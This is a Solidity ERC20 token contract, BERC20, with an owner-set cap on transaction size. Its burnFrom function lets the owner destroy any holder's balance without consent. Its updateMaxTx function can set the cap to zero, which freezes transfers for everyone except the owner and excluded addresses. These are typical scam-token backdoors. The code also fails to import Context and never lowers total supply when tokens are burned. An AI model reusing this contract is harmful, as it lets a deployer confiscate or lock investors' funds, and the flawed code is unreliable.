// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BERC20 is Context, IERC20, Ownable {
    uint8 private constant _decimals = 18;

    uint256 private _totalSupply;

    string private _name;

    string private _symbol;

    uint256 public maxTx;

    uint256 private _maxTxAmount;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private isExcludedFromMaxTx;

    event MaxTxUpdated(uint256 _maxTx);

    error ZeroAddressUnallowed();

    error InvalidAmount();

    error MaxTxExceeded();

    constructor(string memory name_, string memory symbol_, uint256 supply, uint256 _maxTx) Ownable(msg.sender) {
        _name = name_;

        _symbol = symbol_;

        _totalSupply = supply * 10 ** _decimals;

        _balances[_msgSender()] = _totalSupply;

        isExcludedFromMaxTx[_msgSender()] = true;

        isExcludedFromMaxTx[address(this)] = true;

        _updateMaxTx(_maxTx);

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);

        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);

        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        if (owner == address(0) || spender == address(0)) revert ZeroAddressUnallowed();

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (from == address(0) || to == address(0)) revert ZeroAddressUnallowed();
        if (amount == 0) revert InvalidAmount();

        if (!isExcludedFromMaxTx[from]) {
            if (amount > _maxTxAmount) revert MaxTxExceeded();
        }

        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;

        emit Transfer(from, to, amount);
    }

    function _updateMaxTx(uint256 _maxTx) internal {
        maxTx = _maxTx;
        _maxTxAmount = (maxTx * _totalSupply) / 100;

        emit MaxTxUpdated(_maxTx);
    }

    function updateMaxTx(uint256 _maxTx) public onlyOwner {
        _updateMaxTx(_maxTx);
    }

    function excludeFromMaxTx(address user) public onlyOwner {
        if (user == address(0)) revert ZeroAddressUnallowed();

        isExcludedFromMaxTx[user] = true;
    }

    function _burn(address user, uint256 amount) internal {
        if (user == address(0)) revert ZeroAddressUnallowed();
        _balances[user] = _balances[user] - amount;
    }

    function burnFrom(address user, uint256 amount) public onlyOwner {
        if (user == address(0)) revert ZeroAddressUnallowed();
        _balances[user] = _balances[user] - amount;
        emit Transfer(user, address(0), amount);
    }
}
